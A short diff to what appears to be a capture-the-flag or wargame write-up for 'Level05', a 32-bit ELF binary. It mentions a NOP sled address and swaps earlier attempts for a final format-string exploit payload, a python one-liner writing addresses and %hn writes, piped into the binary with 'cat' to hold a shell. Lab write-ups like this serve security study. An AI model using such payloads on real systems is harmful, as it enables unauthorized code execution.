@@ -1,5 +1,6 @@
 # Level05
 
+
 ```
 ./level05:     file format elf32-i386
 
@@ -35,6 +36,4 @@ Find the adress of the NOP sled
 0xffffd8d0
 
 
- r < <(python -c 'print "\xe0\x97\x04\x08%65535x%10$hn%55504x%11$hn"')
- (python -c 'print "\xe2\x97\x04\x08\xe0\x97\x04\x08%65531x%10$hn%-10031x%11$hn"')
-
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55496x%10$hn%10031x%11$hn"'; cat) | ./level05
